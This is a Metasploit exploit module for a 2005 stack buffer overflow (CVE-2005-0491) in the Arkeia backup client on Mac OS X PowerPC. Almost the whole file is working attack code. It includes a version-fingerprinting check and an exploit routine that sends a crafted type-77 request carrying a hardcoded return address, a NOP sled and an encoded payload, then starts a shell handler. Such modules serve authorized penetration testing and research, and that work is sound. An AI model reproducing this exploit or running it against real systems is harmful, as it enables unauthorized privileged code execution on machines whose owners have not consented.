##
# $Id: type77.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Arkeia

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Arkeia Backup Client Type 77 Overflow (Mac OS X)',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the Arkeia backup
				client for the Mac OS X platform. This vulnerability affects
				all versions up to and including 5.3.3 and has been tested
				with Arkeia 5.3.1 on Mac OS X 10.3.5.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2005-0491'],
					[ 'OSVDB', '14011'],
					[ 'BID', '12594'],
					[ 'URL', 'http://lists.netsys.com/pipermail/full-disclosure/2005-February/031831.html'],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'MinNops'  => 700,
					'Compat'   =>
					{
						'ConnectionType' => '-find',
					},
				},
			'Targets'        =>
				[
					[
						'Arkeia 5.3.1 Stack Return (boot)',
						{
							'Platform' => 'osx',
							'Arch'     => ARCH_PPC,
							'Ret'      => 0xbffff910,
						},
					],
				],
			'DisclosureDate' => 'Feb 18 2005',
			'DefaultTarget' => 0))
	end

	def check
		info = arkeia_info()
		if !(info and info['Version'])
			return Exploit::CheckCode::Safe
		end

		print_status("Arkeia Server Information:")
		info.each_pair { |k,v|
			print_status("   #{k + (" " * (30-k.length))} = #{v}")
		}

		if (info['System'] !~ /Darwin/)
			print_status("This module only supports Mac OS X targets")
			return Exploit::CheckCode::Detected
		end

		if (info['Version'] =~ /Backup (4\.|5\.([012]\.|3\.[0123]$))/)
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		# Request has to be big enough to find and small enough
		# not to write off the end of the stack. If we write too
		# far down, we also smash env[], which causes a crash in
		# getenv() before our function returns.

		head = "\x00\x4d\x00\x03\x00\x01\xff\xff"
		head[6, 2] = [1200].pack('n')

		buf = rand_text_english(1200, payload_badchars)

		# Return back to the stack either directly or via system lib
		buf[0, 112] = [target.ret].pack('N') * (112/4)

		# Huge nop slep followed by the payload
		buf[112, payload.encoded.length] = payload.encoded

		print_status("Sending request...")
		begin
			sock.put(head)
			sock.put(buf)
			sock.get_once
		rescue IOError, EOFError => e
			print_status("Exception: #{e.class}:#{e}")
		end
		handler
		disconnect
	end

end